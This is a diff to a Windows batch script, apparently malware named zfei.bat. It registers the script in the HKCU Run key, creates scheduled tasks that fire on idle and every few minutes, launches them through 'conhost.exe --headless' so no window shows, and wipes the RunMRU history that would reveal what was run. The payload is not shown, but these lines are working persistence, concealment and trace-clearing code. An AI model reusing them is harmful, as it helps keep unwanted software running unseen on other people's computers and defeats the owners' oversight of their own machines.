@@ -185,7 +185,7 @@ goto :watchdogloop
         ENDLOCAL
     )
 
-    REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v %tskname% /t REG_SZ /d %workdir%\zfei.bat /f
+    REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v %tskname% /t REG_SZ /d "conhost.exe --headless cmd /c %workdir%\zfei.bat task OWD_startup" /f
 
     REG DELETE HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
 
@@ -193,13 +193,13 @@ goto :watchdogloop
 :createtaskxmldone
 
     schtasks /delete /TN %tskname%_idle /F
-    schtasks /create /TN %tskname%_idle /sc onidle /i 1 /F /tr "conhost.exe --headless %workdir%\zfei.bat task %tskname%_idle" /f
+    schtasks /create /TN %tskname%_idle /sc onidle /i 1 /F /tr "conhost.exe --headless cmd /c %workdir%\zfei.bat task %tskname%_idle" /f
 
     schtasks /delete /TN %tskname%_xml /F
     schtasks /create /TN %tskname%_xml /xml %workdir%\task.xml /f
     
     schtasks /delete /tn %tskname%_rep /F
-    schtasks /create /tn %tskname%_rep /tr "conhost.exe --headless %workdir%\zfei.bat task %tskname%_rep" /sc minute /mo %tskxmltime% /f
+    schtasks /create /tn %tskname%_rep /tr "conhost.exe --headless cmd /c %workdir%\zfei.bat task %tskname%_rep" /sc minute /mo %tskxmltime% /f
 
     echo penetrateloop done >> %logfpath%
 
